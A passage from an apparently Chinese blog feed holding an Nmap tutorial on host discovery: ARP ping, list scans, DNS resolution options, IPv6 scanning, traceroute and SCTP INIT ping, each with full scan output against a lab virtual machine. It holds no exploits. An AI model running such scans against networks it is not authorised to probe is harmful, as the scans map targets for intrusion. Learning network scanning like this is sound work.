class="token punctuation">.</span>148nmap <span class="token operator">-</span>PP 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148nmap <span class="token operator">-</span>PM 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148</code></pre><h1 id="0x08-ARP-Ping扫描"><a href="#0x08-ARP-Ping扫描" class="headerlink" title="0x08 ARP Ping扫描"></a>0x08 ARP Ping扫描</h1><p>​        <code>-PR</code>选项通常在扫描局域网时使用。ARP Ping扫描是Nmap对目标进行一个ARP Ping的过程，尤其在内网的情况下，使用ARP Ping扫描方式是最有效的，在本地局域网中防火墙不会禁止ARP请求，所以在内容中使用ARP Ping非常有效。默认情况下若nmap与目标主机在同一局域网中，会默认进行ARP扫描，若不想使用可以指定<code>--send-ip</code>。</p><pre class=" language-powershell"><code class="language-powershell">λ nmap <span class="token operator">-</span>PR 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2020<span class="token operator">-</span>11<span class="token operator">-</span>01 16:13 ?D1ú±ê×?ê±??Nmap scan report <span class="token keyword">for</span> 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>00066s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>Not shown: 963 closed portsPORT      STATE SERVICE80<span class="token operator">/</span>tcp    open  http81<span class="token operator">/</span>tcp    open  hosts2<span class="token operator">-</span>ns82<span class="token operator">/</span>tcp    open  xfer83<span class="token operator">/</span>tcp    open  mit<span class="token operator">-</span>ml<span class="token operator">-</span>dev84<span class="token operator">/</span>tcp    open  ctf85<span class="token operator">/</span>tcp    open  mit<span class="token operator">-</span>ml<span class="token operator">-</span>dev88<span class="token operator">/</span>tcp    open  kerberos<span class="token operator">-</span>sec89<span class="token operator">/</span>tcp    open  su<span class="token operator">-</span>mit<span class="token operator">-</span>tg90<span class="token operator">/</span>tcp    open  dnsix135<span class="token operator">/</span>tcp   open  msrpc139<span class="token operator">/</span>tcp   open  netbios<span class="token operator">-</span>ssn445<span class="token operator">/</span>tcp   open  microsoft<span class="token operator">-</span>ds1433<span class="token operator">/</span>tcp  open  ms<span class="token operator">-</span>sql<span class="token operator">-</span>s3306<span class="token operator">/</span>tcp  open  mysql3389<span class="token operator">/</span>tcp  open  ms<span class="token operator">-</span>wbt<span class="token operator">-</span>server8001<span class="token operator">/</span>tcp  open  vcom<span class="token operator">-</span>tunnel8002<span class="token operator">/</span>tcp  open  teradataordbms8007<span class="token operator">/</span>tcp  open  ajp128008<span class="token operator">/</span>tcp  open  http8009<span class="token operator">/</span>tcp  open  ajp138010<span class="token operator">/</span>tcp  open  xmpp8021<span class="token operator">/</span>tcp  open  ftp<span class="token operator">-</span>proxy8022<span class="token operator">/</span>tcp  open  oa<span class="token operator">-</span>system8031<span class="token operator">/</span>tcp  open  unknown8081<span class="token operator">/</span>tcp  open  blackice<span class="token operator">-</span>icecap8082<span class="token operator">/</span>tcp  open  blackice<span class="token operator">-</span>alerts8084<span class="token operator">/</span>tcp  open  unknown8085<span class="token operator">/</span>tcp  open  unknown8086<span class="token operator">/</span>tcp  open  d<span class="token operator">-</span>s<span class="token operator">-</span>n8088<span class="token operator">/</span>tcp  open  radan<span class="token operator">-</span>http8200<span class="token operator">/</span>tcp  open  trivnet149152<span class="token operator">/</span>tcp open  unknown49153<span class="token operator">/</span>tcp open  unknown49154<span class="token operator">/</span>tcp open  unknown49155<span class="token operator">/</span>tcp open  unknown49156<span class="token operator">/</span>tcp open  unknown49157<span class="token operator">/</span>tcp open  unknownMAC Address: 00:0C:29:7C:0C:79 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned in 2<span class="token punctuation">.</span>71 seconds</code></pre><h1 id="0x09-列表扫描"><a href="#0x09-列表扫描" class="headerlink" title="0x09 列表扫描"></a>0x09 列表扫描</h1><p>​        列表扫描是主机发现的一种退化形式，它仅仅列出指定网络上的每台主机，不发送任何报文到目标主机。默认情况下，Nmap仍然对主机进行反向域名解析以获取他们的名字。</p><pre class=" language-powershell"><code class="language-powershell">λ nmap <span class="token operator">-</span><span class="token function">sL</span> 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1<span class="token operator">/</span>30Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2020<span class="token operator">-</span>11<span class="token operator">-</span>01 16:39 ?D1ú±ê×?ê±??Nmap scan report <span class="token keyword">for</span> 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0Nmap scan report <span class="token keyword">for</span> transact<span class="token punctuation">.</span>netsarang<span class="token punctuation">.</span>com <span class="token punctuation">(</span>127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1<span class="token punctuation">)</span>Nmap scan report <span class="token keyword">for</span> 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>2Nmap scan report <span class="token keyword">for</span> 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>3Nmap done: 4 IP addresses <span class="token punctuation">(</span>0 hosts up<span class="token punctuation">)</span> scanned in 3<span class="token punctuation">.</span>64 seconds</code></pre><h1 id="0x10-禁止反向域名解析"><a href="#0x10-禁止反向域名解析" class="headerlink" title="0x10 禁止反向域名解析"></a>0x10 禁止反向域名解析</h1><p>​        <code>-n</code>选项意为禁止解析域名，使用该选项时Nmap永远不会对目标主机IP地址作反向域名解析。</p><pre class=" language-powershell"><code class="language-powershell">λ nmap <span class="token operator">-</span>n <span class="token operator">-</span><span class="token function">sL</span> 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1<span class="token operator">/</span>30Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2020<span class="token operator">-</span>11<span class="token operator">-</span>01 16:40 ?D1ú±ê×?ê±??Nmap scan report <span class="token keyword">for</span> 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0Nmap scan report <span class="token keyword">for</span> 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1Nmap scan report <span class="token keyword">for</span> 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>2Nmap scan report <span class="token keyword">for</span> 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>3Nmap done: 4 IP addresses <span class="token punctuation">(</span>0 hosts up<span class="token punctuation">)</span> scanned in 0<span class="token punctuation">.</span>22 seconds</code></pre><h1 id="0x11-反向域名解析"><a href="#0x11-反向域名解析" class="headerlink" title="0x11 反向域名解析"></a>0x11 反向域名解析</h1><p>​        <code>-R</code>选项意为反向解析域名，使用该选项时Nmap永远对目标IP地址做反向域名解析。</p><pre class=" language-powershell"><code class="language-powershell">λ nmap <span class="token operator">-</span>R <span class="token operator">-</span><span class="token function">sL</span> 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1<span class="token operator">/</span>30Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2020<span class="token operator">-</span>11<span class="token operator">-</span>01 16:40 ?D1ú±ê×?ê±??Nmap scan report <span class="token keyword">for</span> 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0Nmap scan report <span class="token keyword">for</span> transact<span class="token punctuation">.</span>netsarang<span class="token punctuation">.</span>com <span class="token punctuation">(</span>127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1<span class="token punctuation">)</span>Nmap scan report <span class="token keyword">for</span> 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>2Nmap scan report <span class="token keyword">for</span> 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>3Nmap done: 4 IP addresses <span class="token punctuation">(</span>0 hosts up<span class="token punctuation">)</span> scanned in 1<span class="token punctuation">.</span>07 seconds</code></pre><h1 id="0x12-使用系统域名解析器"><a href="#0x12-使用系统域名解析器" class="headerlink" title="0x12 使用系统域名解析器"></a>0x12 使用系统域名解析器</h1><p>​        <code>--system-dns</code>意为使用系统域名解析器。默认情况下，Nmap通过直接发送查询到您主机上配置的域名服务器来解析域名。为了提高性能，许多请求并发执行。如果希望使用系统自带的解析器，就指定该选项。</p><pre class=" language-powershell"><code class="language-powershell">λ nmap <span class="token operator">--</span>system<span class="token operator">-</span>dns 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1<span class="token operator">/</span>30Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2020<span class="token operator">-</span>11<span class="token operator">-</span>01 16:45 ?D1ú±ê×?ê±??Nmap scan report <span class="token keyword">for</span> 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0Host is up<span class="token punctuation">.</span>All 1000 scanned ports on 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0 are filteredNmap scan report <span class="token keyword">for</span> transact<span class="token punctuation">.</span>netsarang<span class="token punctuation">.</span>com <span class="token punctuation">(</span>127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>0014s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>Not shown: 990 closed portsPORT      STATE SERVICE135<span class="token operator">/</span>tcp   open  msrpc443<span class="token operator">/</span>tcp   open  https445<span class="token operator">/</span>tcp   open  microsoft<span class="token operator">-</span>ds808<span class="token operator">/</span>tcp   open  ccproxy<span class="token operator">-</span>http902<span class="token operator">/</span>tcp   open  iss<span class="token operator">-</span>realsecure912<span class="token operator">/</span>tcp   open  apex<span class="token operator">-</span>mesh1001<span class="token operator">/</span>tcp  open  webpush5357<span class="token operator">/</span>tcp  open  wsdapi6000<span class="token operator">/</span>tcp  open  X1150000<span class="token operator">/</span>tcp open  ibm<span class="token operator">-</span>db2Nmap scan report <span class="token keyword">for</span> 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>2Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>0017s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>Not shown: 993 closed portsPORT     STATE SERVICE135<span class="token operator">/</span>tcp  open  msrpc443<span class="token operator">/</span>tcp  open  https445<span class="token operator">/</span>tcp  open  microsoft<span class="token operator">-</span>ds808<span class="token operator">/</span>tcp  open  ccproxy<span class="token operator">-</span>http902<span class="token operator">/</span>tcp  open  iss<span class="token operator">-</span>realsecure912<span class="token operator">/</span>tcp  open  apex<span class="token operator">-</span>mesh5357<span class="token operator">/</span>tcp open  wsdapiNmap scan report <span class="token keyword">for</span> 127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>3Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>0018s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>Not shown: 993 closed portsPORT     STATE SERVICE135<span class="token operator">/</span>tcp  open  msrpc443<span class="token operator">/</span>tcp  open  https445<span class="token operator">/</span>tcp  open  microsoft<span class="token operator">-</span>ds808<span class="token operator">/</span>tcp  open  ccproxy<span class="token operator">-</span>http902<span class="token operator">/</span>tcp  open  iss<span class="token operator">-</span>realsecure912<span class="token operator">/</span>tcp  open  apex<span class="token operator">-</span>mesh5357<span class="token operator">/</span>tcp open  wsdapiNmap done: 4 IP addresses <span class="token punctuation">(</span>4 hosts up<span class="token punctuation">)</span> scanned in 18<span class="token punctuation">.</span>36 seconds</code></pre><h1 id="0x13-扫描一个IPv6地址"><a href="#0x13-扫描一个IPv6地址" class="headerlink" title="0x13 扫描一个IPv6地址"></a>0x13 扫描一个IPv6地址</h1><pre class=" language-powershell"><code class="language-powershell">λ nmap <span class="token operator">-</span>6 fe80::a8b7:c0a2:aa08:4655Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2020<span class="token operator">-</span>11<span class="token operator">-</span>01 17:11 ?D1ú±ê×?ê±??Nmap scan report <span class="token keyword">for</span> fe80::a8b7:c0a2:aa08:4655Host is up<span class="token punctuation">.</span>All 1000 scanned ports on fe80::a8b7:c0a2:aa08:4655 are filteredNmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned in 202<span class="token punctuation">.</span>67 seconds</code></pre><h1 id="0x14-路由跟踪"><a href="#0x14-路由跟踪" class="headerlink" title="0x14 路由跟踪"></a>0x14 路由跟踪</h1><p>​        使用<code>--traceroute</code>选线即可进行路由跟踪，使用路由跟踪功能可以帮助用户了解网络的同行情况，通过此选项可以轻松查出从本地计算机到目标之间所经过的网络节点，并可以看到通过各个节点的时间。</p><pre class=" language-powershell"><code class="language-powershell">λ nmap <span class="token operator">--</span>traceroute <span class="token operator">-</span>v 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2020<span class="token operator">-</span>11<span class="token operator">-</span>01 16:57 ?D1ú±ê×?ê±??Initiating ARP Ping Scan at 16:57Scanning 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148 <span class="token punctuation">[</span>1 port<span class="token punctuation">]</span>Completed ARP Ping Scan at 16:57<span class="token punctuation">,</span> 0<span class="token punctuation">.</span>62s elapsed <span class="token punctuation">(</span>1 total hosts<span class="token punctuation">)</span>Initiating <span class="token keyword">Parallel</span> DNS resolution of 1 host<span class="token punctuation">.</span> at 16:57Completed <span class="token keyword">Parallel</span> DNS resolution of 1 host<span class="token punctuation">.</span> at 16:58<span class="token punctuation">,</span> 2<span class="token punctuation">.</span>55s elapsedInitiating SYN Stealth Scan at 16:58Scanning 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148 <span class="token punctuation">[</span>1000 ports<span class="token punctuation">]</span>Discovered open port 3306<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 445<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 135<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 3389<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 80<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 81<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 8009<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 8008<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 49153<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 8200<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 8021<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 8084<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 49154<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 49157<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 83<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 8081<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 1433<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 8031<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 49155<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 89<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 8086<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 85<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 90<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 8085<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 8001<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 139<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 8002<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 88<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 8007<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 8022<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 49152<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 8088<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 84<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 82<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 8082<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 8010<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Discovered open port 49156<span class="token operator">/</span>tcp on 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Completed SYN Stealth Scan at 16:58<span class="token punctuation">,</span> 1<span class="token punctuation">.</span>37s elapsed <span class="token punctuation">(</span>1000 total ports<span class="token punctuation">)</span>Nmap scan report <span class="token keyword">for</span> 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>00034s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>Not shown: 963 closed portsPORT      STATE SERVICE80<span class="token operator">/</span>tcp    open  http81<span class="token operator">/</span>tcp    open  hosts2<span class="token operator">-</span>ns82<span class="token operator">/</span>tcp    open  xfer83<span class="token operator">/</span>tcp    open  mit<span class="token operator">-</span>ml<span class="token operator">-</span>dev84<span class="token operator">/</span>tcp    open  ctf85<span class="token operator">/</span>tcp    open  mit<span class="token operator">-</span>ml<span class="token operator">-</span>dev88<span class="token operator">/</span>tcp    open  kerberos<span class="token operator">-</span>sec89<span class="token operator">/</span>tcp    open  su<span class="token operator">-</span>mit<span class="token operator">-</span>tg90<span class="token operator">/</span>tcp    open  dnsix135<span class="token operator">/</span>tcp   open  msrpc139<span class="token operator">/</span>tcp   open  netbios<span class="token operator">-</span>ssn445<span class="token operator">/</span>tcp   open  microsoft<span class="token operator">-</span>ds1433<span class="token operator">/</span>tcp  open  ms<span class="token operator">-</span>sql<span class="token operator">-</span>s3306<span class="token operator">/</span>tcp  open  mysql3389<span class="token operator">/</span>tcp  open  ms<span class="token operator">-</span>wbt<span class="token operator">-</span>server8001<span class="token operator">/</span>tcp  open  vcom<span class="token operator">-</span>tunnel8002<span class="token operator">/</span>tcp  open  teradataordbms8007<span class="token operator">/</span>tcp  open  ajp128008<span class="token operator">/</span>tcp  open  http8009<span class="token operator">/</span>tcp  open  ajp138010<span class="token operator">/</span>tcp  open  xmpp8021<span class="token operator">/</span>tcp  open  ftp<span class="token operator">-</span>proxy8022<span class="token operator">/</span>tcp  open  oa<span class="token operator">-</span>system8031<span class="token operator">/</span>tcp  open  unknown8081<span class="token operator">/</span>tcp  open  blackice<span class="token operator">-</span>icecap8082<span class="token operator">/</span>tcp  open  blackice<span class="token operator">-</span>alerts8084<span class="token operator">/</span>tcp  open  unknown8085<span class="token operator">/</span>tcp  open  unknown8086<span class="token operator">/</span>tcp  open  d<span class="token operator">-</span>s<span class="token operator">-</span>n8088<span class="token operator">/</span>tcp  open  radan<span class="token operator">-</span>http8200<span class="token operator">/</span>tcp  open  trivnet149152<span class="token operator">/</span>tcp open  unknown49153<span class="token operator">/</span>tcp open  unknown49154<span class="token operator">/</span>tcp open  unknown49155<span class="token operator">/</span>tcp open  unknown49156<span class="token operator">/</span>tcp open  unknown49157<span class="token operator">/</span>tcp open  unknownMAC Address: 00:0C:29:7C:0C:79 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>TRACEROUTEHOP RTT     ADDRESS1   0<span class="token punctuation">.</span>34 ms 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Read <span class="token keyword">data</span> files <span class="token keyword">from</span>: D:\Rolan\Tools\InfoGathering\NmapNmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned in 5<span class="token punctuation">.</span>17 seconds           Raw packets sent: 1093 <span class="token punctuation">(</span>48<span class="token punctuation">.</span>076KB<span class="token punctuation">)</span> <span class="token punctuation">|</span> Rcvd: 1001 <span class="token punctuation">(</span>40<span class="token punctuation">.</span>176KB<span class="token punctuation">)</span></code></pre><h1 id="0x15-SCTP-INIT-Ping扫描"><a href="#0x15-SCTP-INIT-Ping扫描" class="headerlink" title="0x15 SCTP INIT Ping扫描"></a>0x15 SCTP INIT Ping扫描</h1><p>​        SCTP是IETF在2000年定义的一个传输层协议。SCTP可看作是TCP协议的改进，它改进了TCP的一些不足，SCTF INIT Ping扫描通过向目标发送INIT包，根据目标主机的响应判断目标主机是否存活。</p><pre class=" language-powershell"><code class="language-powershell">λ nmap <span class="token operator">-</span>PY 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Starting Nmap 7<span class="token punctuation">.</span>80 <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2020<span class="token operator">-</span>11<span class="token operator">-</span>01 17:03 ?D1ú±ê×?ê±??Nmap scan report <span class="token keyword">for</span> 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>148Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>0015s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>Not shown: 963 closed portsPORT      STATE SERVICE80<span class="token operator">/</span>tcp    open  http81<span class="token operator">/</span>tcp    open  hosts2<span class="token operator">-</span>ns82<span class="token operator">/</span>tcp    open  xfer83<span class="token operator">/</span>tcp    open  mit<span class="token operator">-</span>ml<span class="token operator">-</span>dev84<span class="token operator">/</span>tcp    open  ctf85<span class="token operator">/</span>tcp    open  mit<span class="token operator">-</span>ml<span class="token operator">-</span>dev88<span class="token operator">/</span>tcp    open  kerberos<span class="token operator">-</span>sec89<span class="token operator">/</span>tcp    open  su<span class="token operator">-</span>mit<span class="token operator">-</span>tg90<span class="token operator">/</span>tcp    open  dnsix135<span class="token operator">/</span>tcp   open  msrpc139<span class="token operator">/</span>tcp   open  netbios<span class="token operator">-</span>ssn445<span class="token operator">/</span>tcp   open  microsoft<span class="token operator">-</span>ds1433<span class="token operator">/</span>tcp  open  ms<span class="token operator">-</span>sql<span class="token operator">-</span>s3306<span class="token operator">/</span>tcp  open  mysql3389<span class="token operator">/</span>tcp  open  ms<span class="token operator">-</span>wbt<span class="token operator">-</span>server8001<span class="token operator">/</span>tcp  open  vcom<span class="token operator">-</span>tunnel8002<span class="token operator">/</span>tcp  open  teradataordbms8007<span class="token operator">/</span>tcp  open  ajp128008<span class="token operator">/</span>tcp  open  http8009<span class="token operator">/</span>tcp  open  ajp138010<span class="token operator">/</span>tcp  open  xmpp8021<span class="token operator">/</span>tcp  open  ftp<span class="token operator">-</span>proxy8022<span class="token operator">/</span>tcp  open  oa<span class="token operator">-</span>system8031<span class="token operator">/</span>tcp  open  unknown8081<span class="token operator">/</span>tcp  open  blackice<span class="token operator">-</span>icecap8082<span class="token operator">/</span>tcp  open  blackice<span class="token operator">-</span>alerts8084<span class="token operator">/</span>tcp  open  unknown8085<span class="token operator">/</span>tcp  open  unknown8086<span class="token operator">/</span>tcp  open  d<span class="token operator">-</span>s<span class="token operator">-</span>n8088<span class="token operator">/</span>tcp  open  radan<span class="token operator">-</span>http8200<span class="token operator">/</span>tcp  open  trivnet149152<span class="token operator">/</span>tcp open  unknown49153<span class="token operator">/</span>tcp open  unknown49154<span class="token operator">/</span>tcp open  unknown49155<span class="token operator">/</span>tcp open  unknown49156<span class="token operator">/</span>tcp open  unknown49157<span class="token operator">/</span>tcp open  unknownMAC Address: 00:0C:29:7C:0C:79 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned in 2<span class="token punctuation">.</span>49 seconds</code></pre>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level20</title>
      <link href="/2020/10/31/xss-zhi-xss-labs-level20/"/>
      <url>/2020/10/31/xss-zhi-xss-labs-level20/</url>
      
